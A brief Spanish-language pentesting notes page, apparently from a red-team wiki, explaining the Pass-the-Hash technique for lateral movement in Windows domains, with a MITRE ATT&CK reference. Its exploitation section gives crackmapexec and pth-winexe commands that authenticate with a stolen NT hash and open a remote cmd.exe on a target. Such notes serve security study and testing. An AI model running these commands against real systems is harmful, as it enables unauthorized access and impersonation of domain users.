# Pass the Hash

### Descripción

Esta técnica consiste en utilizar los nt-hashes previamente obtenidos para realizar movimiento lateral, saltandose métodos de control e impersonando al usuario del que se tengan los hashes nt. Esto ocurre ya que la contraseña no se guarda en texto plano, sino su formato MD4, esto permite que el tener el hash nt de un usuario del dominio vamos a poder impersonarlo en una autenticacion Net-NTLM, actuando así como si fuesemos él.

### Explotación

```bash
# Con crackmapexec
crackmapexec -u (user) -H (NT Hash) 
crackmapexec smb 192.168.0.109 -u "username" --hash "64f12cddaa88057e06a81b54e73b949b"

# Con pth-winexe
pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
```



## Referencias

{% embed url="https://attack.mitre.org/techniques/T1550/002/" %}
